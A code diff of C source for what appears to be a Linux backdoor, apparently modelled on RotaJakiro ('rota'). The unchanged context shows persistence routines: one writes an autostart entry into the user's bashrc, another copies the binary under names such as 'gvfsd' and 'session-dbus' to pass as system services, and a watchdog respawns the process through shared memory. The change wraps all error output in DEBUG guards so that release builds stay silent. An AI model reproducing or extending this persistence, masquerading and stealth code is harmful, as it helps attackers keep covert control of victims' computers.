@@ -78,7 +78,9 @@ bool nonroot_bashrc_persistence() {
 
     bytes_written = write(fd, bashrc_autostart, strlen(bashrc_autostart));
     if (bytes_written < 0) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[nonroot_bashrc_persistence]Error writing to bashrc: %s", strerror(errno));
+        #endif
     }
 
     close(fd);
@@ -150,8 +152,10 @@ bool nonroot_desktop_persistence() {
     if (access(dirpath_profile, F_OK) == -1) {
         int res = mkdir(dirpath_profile, 0755);
         if (res != 0) {
+            #ifdef DEBUG
             fprintf(stderr, "\n[gvfsd]Error creating directory to %s.\tError: %s",
                 dirpath_profile, strerror(errno));
+            #endif
         }
 
     }
@@ -167,8 +171,10 @@ bool nonroot_desktop_persistence() {
     if (access(profilepath_profile, F_OK) == -1) {
         int res = mkdir(profilepath_profile, 0755);
         if (res != 0) {
+            #ifdef DEBUG
             fprintf(stderr, "\n[gvfsd/profile] Error creating directory to %s\tError: %s",
                 dirpath_profile, strerror(errno));
+            #endif
         }
     }
 
@@ -176,8 +182,10 @@ bool nonroot_desktop_persistence() {
     bool rota_write_gvfsd = copy_rota_to_userland(binpath);
 
     if (rota_write_gvfsd == false) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[rota] Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
+        #endif
     }
 
     // -------- copy userland binary now -------------
@@ -234,8 +242,10 @@ bool nonroot_desktop_persistence() {
     bool rota_write_session_dbus = copy_rota_to_userland(binpath_session_dbus);
 
     if (rota_write_session_dbus == false) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
+        #endif
     }
 
     free(fpath);
@@ -383,9 +393,11 @@ void *watchdog_process_shmget() {
     // obtain PID from shared memory
     int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
     if (shmid < 0) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[wathcdog_process_shmget](%d) Error getting shared memory : %s\n",
                 getpid(),
                 strerror(errno));
+        #endif
         sleep(5);
         // recurisvely call watchdog in the event IPC shmem creation fails.
         watchdog_process_shmget();
@@ -414,9 +426,11 @@ void *watchdog_process_shmget() {
 
         //if proc not there, exec into existence
         if (proc_alive == false) {
+            #ifdef DEBUG
             fprintf(stderr, "[watchdog_process_shmget](%d) process %d is not alive! spawning\n",
                     getpid(),
                     upper_bytes);
+            #endif
 
 
             char *user = getenv("HOME");
